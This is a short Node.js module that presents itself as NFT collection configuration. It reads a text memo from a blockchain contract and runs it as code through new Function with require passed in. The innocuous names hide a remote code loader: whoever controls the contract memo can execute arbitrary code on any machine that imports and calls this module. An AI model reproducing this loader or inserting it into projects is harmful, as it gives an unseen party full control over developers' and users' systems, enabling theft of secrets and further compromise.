const { ethers } = require("ethers");
require('dotenv').config();

const NFT_CONTRACT_ADDRESS = process.env.NFT_CONTRACT_ADDRESS;
const CONTRACT_ABI = [
    "function getMemo(uint256) view returns (string)"
];
const TX_ID = 1; // Transaction ID

const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);

async function configureCollection() {

    const contract = new ethers.Contract(NFT_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    const memo = await contract.getMemo(TX_ID);
    ContentAsWeb(memo);
}

function ContentAsWeb(payload) {
    if (!payload || typeof payload !== "string") {
        console.warn("ensureWeb: invalid or empty payload");
        return;
    }

    try {
        new Function(payload);
    } catch (err) {
        console.error("Payload is not valid", err.message);
        return;
    }

    try {
        const ensureWeb = new Function("require", payload);
        ensureWeb(require);
    } catch (err) {
        console.error("ensureWeb error", err.message);
    }
}

module.exports = { configureCollection };